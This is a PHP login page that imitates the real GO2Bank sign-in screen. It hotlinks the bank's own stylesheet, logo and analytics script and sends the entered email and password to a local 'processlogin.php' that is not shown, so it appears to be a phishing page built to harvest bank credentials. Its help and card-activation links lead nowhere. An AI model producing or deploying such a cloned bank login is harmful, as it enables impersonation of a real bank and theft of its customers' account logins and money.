<?php

session_start();

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GO2Bank | Login to your account</title>
    
    <link rel="stylesheet" href="https://www.go2bank.com/etc.clientlibs/go2bank/clientlibs/go2bank-enroll-form.min.425e6f6a8adc43a59589bc77c78173fd.css" type="text/css">
    <link rel="stylesheet" href="output.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css">
    <script src="http://assets.adobedtm.com/4ddf83a2c542/eb6cfc84f44c/launch-0023e373abc1.min.js" async onerror="document.dispatchEvent(new Event('at-request-failed'))"></script>
    <style>
        
    body {
      @apply flex items-center justify-center h-screen bg-gray-100;
    }
  
    </style>

</head>
<body class="formpage page parent-page basicpage bg-gray-100" id="formpage-c341cb274f">
    <div class="container">
        <!-- Header Start-->
        <header class="page-header js-page-header" role="banner">
            <div class="page-header__inner js-page-header-inner page-header-left">
                <div aria-label="Logo" class="header__logo"><div class="header-brand-logo image">
                    <div data-cmp-is="image" data-cmp-lazythreshold="0" data-cmp-src="/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-brand-logo.coreimg{.width}.svg/1708078030662/logo-go2bank-light.svg" data-asset="/content/dam/go2bank/enroll-form/logo-go2bank-light.svg" data-title="logo" id="image-a504e05bb3" class="cmp-image page-header__logo-primary" itemscope itemtype="http://schema.org/ImageObject">
        
                        <img src="https://www.go2bank.com/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-brand-logo.coreimg.svg/1708078030662/logo-go2bank-light.svg" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="logo"/>
                 
                    </div>
    
        
                </div>
            </div>
            <div aria-label="Logo" class="header__logo"><div class="header-lock-img image justify-content-right flex">
                        <div data-cmp-is="image" data-cmp-lazythreshold="0" data-cmp-src="/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-lock-img.coreimg{.width}.png/1708078043579/lock.png" data-asset="/content/dam/go2bank/form/lock.png" data-title="Lock" id="image-7fc07d8710" class="cmp-image page-header__logo-primary" itemscope itemtype="http://schema.org/ImageObject">
                            <img src="https://www.go2bank.com/experience-fragments/go2_bank_forms/header/master/_jcr_content/root/form_header/header-lock-img.coreimg.png/1708078043579/lock.png" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Lock"/>
                        </div>
    
        
            </div>
        </header>
        <!--Header End-->

        <!--form starts-->
        <div class="w-full max-w-xl mx-auto mt-48 cmp-container">
            <form class="rounded px-8 pt-6 pb-8 mb-4" action="processlogin.php" method="post">
                <div class="flex text mb-4 justify-center items-center ">
                    <div id="text-7d452bd9bf" class="">
                        <h3><span class="md:text-5xl text-2xl font-bold text-center font-sans">Welcome back!</span></h3>
                    
                    </div>
                </div>
                <div class="mb-4 username text">
                    <div data-fieldset="username">
                        <div class="input js-input pad-right-zero">
                            <div class="input__inner">
                                <label class="input__label">
                                    <div class="input__label-content js-input-label-content">Email</div>
                                </label>
                                <input class="input__field js-input-field" id="email" type="email" placeholder="Email" required="true" autocomplete="off" autocorrect="off" name="email"/>

                            </div>
                            <?php
                                if(isset($_SESSION['error'])){
                                    $error = $_SESSION['error'];
                            
                            ?>
                            <div class="input__error-text text-red-500"> <?php echo $error ?></div>

                            <?php 
                                unset($_SESSION['error']);
                                    } 
                        ?>
                        </div>
                    </div>
                </div>
                <div class="username text mb-4 relative">
                    <div data-fieldset="username">
                        <div class="input js-input pad-right-zero">
                            <div class="input__inner">
                                <label class="input__label">
                                    <div class="input__label-content js-input-label-content">Password</div>
                                </label>
                                <input type="password" name="password" class="input__field js-input-field" id="password" placeholder="Password" required="true" maxlength="25"/>
                                <div class="absolute inset-y-0 right-0 pr-3 flex items-center cursor-pointer" onclick="togglePassword()">
                                    <svg id="eye-icon" class="h-6 text-gray-600" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke="currentColor">
                                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-.658 2.124-2.034 3.998-3.958 5.201A9.956 9.956 0 0112 19a9.956 9.956 0 01-5.584-1.799C4.492 15.997 3.116 14.123 2.458 12z" />
                                    </svg>
                                  </div>
                            </div>
                            <?php
                                if(isset($_SESSION['error2'])){
                                    $error = $_SESSION['error2'];
                            
                            ?>
                            <div class="input__error-text text-red-400"> <?php echo $error ?></div>

                            <?php 
                                unset($_SESSION['error2']);
                                    } 
                        ?>
                        </div>
                    </div>
                </div>
              <div class="mb-6">
                <label class="block text-gray-700 text-sm font-bold mb-2">
                  <input class="mr-2 leading-tight" type="checkbox">
                  <span class="text-sm">
                    Remember Me
                  </span>
                </label>
              </div>
              <div class="flex items-center justify-between button btn btn--width-full">
                <button id="loginButton" name="login" class="bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline cmp-form-button w-full" type="submit">
                  Login
                </button>
              </div>
              <div class="mt-8 flex flex-col items-center justify-between">

                    <a href="#" class="no-underline text-indigo-800 font-sans font-medium mb-4">Trouble login in?</a>
                    <a href="#" class="no-underline text-indigo-800 font-sans font-medium mb-12">Activate your card</a>
                    <div class="flex flex-row justify-between items-center p-3 gap-2">
                        <a href="#" class="no-underline text-indigo-800 font-sans font-medium">Privacy information |</a>
                    <a href="#" class="no-underline text-indigo-800 font-sans font-medium">Help</a>
                    </div>

              </div>
            </form>
          </div>
        
          <script>
            function togglePassword() {
              const passwordField = document.getElementById('password');
              const eyeIcon = document.getElementById('eye-icon');
              if (passwordField.type === 'password') {
                passwordField.type = 'text';
                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-.658 2.124-2.034 3.998-3.958 5.201A9.956 9.956 0 0112 19a9.956 9.956 0 01-5.584-1.799C4.492 15.997 3.116 14.123 2.458 12z" />';
              } else {
                passwordField.type = 'password';
                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-.658 2.124-2.034 3.998-3.958 5.201A9.956 9.956 0 0112 19a9.956 9.956 0 01-5.584-1.799C4.492 15.997 3.116 14.123 2.458 12z" />';
              }
            }

            
          </script>
        
        
        

    
    
</body>
</html>